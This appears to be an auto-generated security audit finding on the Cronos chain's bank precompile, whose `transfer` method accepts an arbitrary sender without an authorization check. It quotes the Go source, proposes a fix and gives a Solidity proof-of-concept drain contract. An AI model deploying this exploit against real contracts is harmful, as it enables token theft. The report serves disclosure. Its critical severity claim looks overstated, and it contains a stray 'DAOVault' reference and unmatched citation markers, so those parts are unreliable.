### Title
Bank Precompile `transfer` Allows Any EVM Contract to Drain Any User's Native Token Balance Without Authorization - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer` method accepts an arbitrary `sender` address as a caller-supplied argument and performs `SendCoins(from, to, ...)` without verifying that the calling contract is authorized to move tokens on behalf of that sender. Any deployed EVM contract can drain the `evm/<contract_address>` native token balance of any user who holds that denom, with no approval or consent mechanism.

---

### Finding Description

The `BankContract.Run()` handler for `TransferMethodName` unpacks `sender` directly from the ABI-encoded call arguments and uses it as the `from` address in a `bankKeeper.SendCoins` call:

```go
// x/cronos/keeper/precompiles/bank.go  lines 175-196
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
from := sdk.AccAddress(sender.Bytes())
to := sdk.AccAddress(recipient.Bytes())
// ...
denom := EVMDenom(contract.Caller())          // evm/<calling_contract>
amt := sdk.NewCoin(denom, ...)
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no check that `sender == contract.Caller()`, no ERC-20-style allowance, and no Cosmos `authz` grant verification. The only guard present is `checkBlockedAddr(to)`, which only rejects module-account recipients. [2](#0-1) 

The denom is `evm/<calling_contract_address>`, constructed by `EVMDenom(contract.Caller())`. [3](#0-2) 

The bank precompile is registered at the fixed address `0x0000000000000000000000000000000000000064` and is callable by any EVM contract with no access restriction. [4](#0-3) 

The `mint` method similarly accepts an arbitrary `recipient` and mints `evm/<caller>` tokens to it with no authorization check, enabling the attacker to seed victim balances before draining them. [5](#0-4) 

---

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled native assets.**

A malicious EVM contract can transfer `evm/<contract_address>` native Cosmos tokens from any holder to any destination without the holder's consent. These are real Cosmos-layer bank balances, not EVM storage values. The `TestBank.sol` integration pattern (`moveToNative`) explicitly converts ERC-20 balances into `evm/<contract>` native tokens, making real user value reachable through this path. [6](#0-5) 

---

### Likelihood Explanation

The attacker needs only to:
1. Deploy a contract (no privilege required).
2. Induce users to hold `evm/<attacker_contract>` tokens (e.g., by presenting a legitimate-looking token with a `moveToNative`-style function).
3. Call `bank.transfer(victim, attacker, victim_balance)` from the same contract.

No admin key, governance access, or leaked secret is required. The entry path is a standard EVM transaction callable by any EOA-funded contract.

---

### Recommendation

The `transfer` method must enforce that the `sender` argument equals `contract.Caller()` (i.e., the calling contract itself), or implement an explicit allowance/approval mechanism before permitting third-party transfers:

```go
// Enforce: only the calling contract may initiate a transfer on behalf of sender
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

Alternatively, restrict `transfer` to move tokens only from the calling contract's own module account, consistent with how `mint_by_cronos_module` and `burn_by_cronos_module` are guarded in `ModuleCRC21.sol`. [7](#0-6) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract DrainAttack {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Lure victim into calling this, converting their ERC-20 to native evm/<this> tokens
    function depositNative(uint256 amount) external {
        // (burn ERC-20 side omitted for brevity)
        bank.mint(msg.sender, amount);   // mints evm/<DrainAttack> to victim
    }

    // Step 2: Attacker calls this at any time — no victim consent required
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller is this contract — no authorization check in precompile
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Victim calls `depositNative(100)` → receives 100 `evm/<DrainAttack>` native tokens.
2. Attacker calls `drain(victim, attacker, 100)` → `bankKeeper.SendCoins(victim, attacker, 100 evm/<DrainAttack>)` executes with no revert.
3. Victim's native balance is zero; attacker holds 100 `evm/<DrainAttack>` tokens.

The root cause — `sender` is caller-supplied with no authorization check — maps directly to the DAOVault analog where `withdraw()` accepted an arbitrary user address callable by the `DEPLOYER` without consent. [1](#0-0)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L32-33)
```go
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
```

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L136-142)
```go
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** contracts/src/ModuleCRC21.sol (L36-38)
```text
    function mint_by_cronos_module(address addr, uint amount) public {
        require(msg.sender == module_address);
        mint(addr, amount);
```
